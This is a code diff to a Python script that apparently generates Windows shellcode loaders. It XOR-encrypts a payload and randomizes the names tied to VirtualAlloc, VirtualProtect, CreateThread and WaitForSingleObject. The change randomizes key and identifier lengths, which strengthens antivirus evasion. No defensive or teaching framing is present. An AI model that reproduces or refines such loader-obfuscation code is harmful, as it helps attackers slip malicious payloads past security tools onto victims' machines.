@@ -5,15 +5,16 @@ import string
 import os
 import time
 
-def get_random_string(length):
+def get_random_string():
     # With combination of lower and upper case
+    length = random.randint(8, 15)
     result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
     # print random string
     return result_str
 
 def xor(data):
     
-    key = get_random_string(9)
+    key = get_random_string()
     l = len(key)
     output_str = ""
 
@@ -39,36 +40,36 @@ def charlotte():
     f3 = "CreateThread"
     f4 = "WaitForSingleObject"
 
-    e1 = get_random_string(16)
-    calc_name = get_random_string(16)
-    va_name = get_random_string(16)
-    vp_name = get_random_string(16)
-    ct_name = get_random_string(16)
-    wfso_name = get_random_string(16)
+    e1 = get_random_string()
+    calc_name = get_random_string()
+    va_name = get_random_string()
+    vp_name = get_random_string()
+    ct_name = get_random_string()
+    wfso_name = get_random_string()
 
-    pl_key_name = get_random_string(16)
-    va_key_name = get_random_string(16)
-    vp_key_name = get_random_string(16)
-    ct_key_name = get_random_string(16)
-    wfso_key_name = get_random_string(16)
+    pl_key_name = get_random_string()
+    va_key_name = get_random_string()
+    vp_key_name = get_random_string()
+    ct_key_name = get_random_string()
+    wfso_key_name = get_random_string()
 
-    pl_key_size = get_random_string(16)
-    va_key_size = get_random_string(16)
-    vp_key_size = get_random_string(16)
-    ct_key_size = get_random_string(16)
-    wfso_key_size = get_random_string(16)
+    pl_key_size = get_random_string()
+    va_key_size = get_random_string()
+    vp_key_size = get_random_string()
+    ct_key_size = get_random_string()
+    wfso_key_size = get_random_string()
 
-    pva = get_random_string(16)
-    pvp = get_random_string(16)
-    pct = get_random_string(16)
-    pwfso = get_random_string(16)
+    pva = get_random_string()
+    pvp = get_random_string()
+    pct = get_random_string()
+    pwfso = get_random_string()
 
-    p_execmem = get_random_string(16)
-    p_rvba = get_random_string(16)
-    p_thba = get_random_string(16)
-    p_oldprotect = get_random_string(16)
+    p_execmem = get_random_string()
+    p_rvba = get_random_string()
+    p_thba = get_random_string()
+    p_oldprotect = get_random_string()
 
-    xor_name = get_random_string(16)
+    xor_name = get_random_string()
 
     print("[*]                    Generating XOR Keys...                      [*]")
     ciphertext, pl_key = xor(plaintext)
